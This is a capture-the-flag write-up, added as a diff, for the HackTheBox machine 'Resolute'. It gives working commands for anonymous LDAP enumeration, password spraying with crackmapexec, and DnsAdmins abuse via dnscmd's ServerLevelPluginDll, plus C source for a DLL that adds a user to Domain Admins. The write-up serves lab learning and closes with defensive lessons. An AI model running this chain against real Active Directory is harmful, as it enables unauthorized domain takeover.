@@ -1,0 +1,120 @@
+---
+title: "Resolute"
+date: 2026-10-20
+difficulty: "Medium"
+os: "Windows"
+platform: "HackTheBox"
+ports: ["53/dns", "88/kerberos", "135/rpc", "139/netbios", "389/ldap", "445/smb", "636/ldaps", "3268/gc", "5985/winrm", "9389/adws"]
+tags: ["active-directory", "ldap", "password-spraying", "dnsadmins", "winrm", "privilege-escalation"]
+summary: "A Windows Server 2016 DC where a password leaked in an LDAP description field kicks off a three-hop credential chain ending in a DnsAdmins abuse for RCE as SYSTEM."
+---
+
+## Summary
+
+Resolute is a Domain Controller of `megabank.local` where access doesn't rely on a single exploit, but on a **chain of oversights**: a password forgotten in an LDAP field, plain-text credentials in a PowerShell log, and finally abusing a `DnsAdmins` membership to run code as SYSTEM. It's a textbook Active Directory walk.
+
+<AttackChain
+  label="Attack chain · from anonymous LDAP to Domain Admin"
+  steps={[
+    { title: 'Anonymous LDAP', desc: 'The anonymous bind lets you read a default password in a description field.', action: 'password spraying against all users' },
+    { title: 'Initial user · WinRM', desc: 'The spray hits another account (Remote Management Users) → remote shell.', action: 'PSTranscripts: net use with clear-text credentials' },
+    { title: 'Second user · DnsAdmins', desc: 'A PowerShell Transcription log leaks new credentials of a DnsAdmins user.', action: 'ServerLevelPluginDll + DNS service restart' },
+    { title: 'SYSTEM → Domain Admins', desc: 'The DNS service (SYSTEM) loads a custom DLL that adds the user to Domain Admins.', tone: 'win' },
+  ]}
+/>
+
+## Reconnaissance
+
+The port scan screams "Domain Controller" at once: DNS (53), Kerberos (88), LDAP (389/636/3268), SMB (445), WinRM (5985) and ADWS (9389). The `-sCV` confirms the terrain:
+
+- Domain and forest: `megabank.local`
+- FQDN: `Resolute.megabank.local`
+- OS: Windows Server 2016 Standard (build 14393)
+- SMB signing: `required` (goodbye relay attacks)
+
+The 88 + 3268 combo leaves no doubt: there's a domain behind it, so enumeration doesn't start with the web (there isn't one) but with whatever the DC lets you see unauthenticated.
+
+## Foothold — password in the description field
+
+The `guest` account is disabled and RID brute over SMB/RPC dies with `ACCESS_DENIED`, but the **anonymous LDAP bind** is still open. Requesting the `sAMAccountName` and `description` attributes of every user object reveals the gem:
+
+```bash
+ldapsearch -x -H ldap://10.129.96.155 -b "DC=megabank,DC=local" "(objectClass=user)" sAMAccountName description
+```
+
+One of the accounts has a default password in plain text in its description. The fine detail: descriptions **aren't updated** when a user changes their password, so that particular account had already rotated it. The right move isn't to try only that account, but to **spray that same password against the whole user list** (password spraying), looking for whoever never touched it.
+
+```bash
+crackmapexec smb 10.129.96.155 -u users.txt -p '<password>' --continue-on-success
+```
+
+The spray validates against a **different** account than the one in the description. That account belongs to `Remote Management Users`, so it gives a direct WinRM shell with `evil-winrm`.
+
+## Pivot — credentials in PSTranscripts
+
+The initial account is plain: no interesting groups, no exploitable privileges. Time to enumerate from inside. A `dir -Force` at the root of `C:\` (the `-Force` is key to see hidden items) reveals a folder that isn't standard Windows: `PSTranscripts`.
+
+Inside is a **PowerShell Transcription** log, the policy that records everything typed in a session. And a `net use` was recorded there, mounting a network share with the credentials passed on the command line itself:
+
+```text
+cmd /c net use X: \\fs01\backups <user> <password>
+```
+
+New credentials for a second user — the same one whose description leaked the default password at the start: they'd already changed it, and this is the good one.
+
+## Privilege Escalation — DnsAdmins abuse
+
+The second user belongs to the **`DnsAdmins`** group. That's the final vector, and it's no accident: it's the machine's intended path.
+
+The Windows DNS service runs as **SYSTEM** and `DnsAdmins` members can configure it. Among the options is `ServerLevelPluginDll`, which tells the service to load a custom plugin DLL on startup. Result: DNS loads **our** DLL with SYSTEM privileges.
+
+The flow:
+
+1. Build a DLL that adds our user to `Domain Admins`.
+2. Upload it to the DC with evil-winrm's `upload` (more reliable than standing up an SMB server, which 2016's `required` signing complicates).
+3. Register the path with `dnscmd`:
+
+```powershell
+dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\Documents\da.dll
+```
+
+4. Restart the service — and here comes the elegant detail: even though the user isn't a local admin, **`DnsAdmins` has permission to stop and start the DNS service** specifically:
+
+```powershell
+sc.exe stop dns
+sc.exe start dns
+```
+
+### The nuance that trips many people up
+
+A DLL from `msfvenom -p windows/x64/exec` turned out **inconsistent**: the service started clean (`RUNNING`) but the payload didn't fire, and the user never joined Domain Admins. The reason is that DNS expects specific plugin functions (`DnsPluginInitialize`...) and msfvenom's execution from `DllMain` doesn't always complete.
+
+The reliable fix is a **minimal hand-written DLL** whose `DllMain` runs the command directly when the process maps it:
+
+```c
+#include <windows.h>
+BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        system("net group \"Domain Admins\" <user> /add /domain");
+    }
+    return TRUE;
+}
+```
+
+```bash
+x86_64-w64-mingw32-gcc adduser.c -shared -o adduser.dll
+```
+
+After clearing the previous `ServerLevelPluginDll`, re-uploading the custom DLL and restarting the service, the user finally appears in **Domain Admins**. With this DLL the DNS service usually stays down, but it doesn't matter: the command already ran on load.
+
+### Token refresh
+
+Last hurdle: the WinRM session token doesn't reflect the newly added group, because the token is computed at authentication time. A cached WinRM session gives `Access denied` reading `root.txt` despite already being Domain Admin. The clean way out is to open a **brand-new session** with a fresh token (for example via `wmiexec`, which bypasses WinRM's cache), and from there access to the Administrator profile is total.
+
+## Lessons
+
+- **There's no single exploit, there's a chain.** Three credential hops chained before the privesc: that's what AD looks like in real life.
+- AD free-text fields (`description`) are readable by anyone who can read the directory: secrets never go there.
+- Command-line credentials end up in logs, histories and transcriptions.
+- `DnsAdmins` is effectively "almost SYSTEM" on a DC: it must be treated as a privileged group.
+- For the DnsAdmins abuse, a custom DLL with `DllMain` is more deterministic than a generic payload.
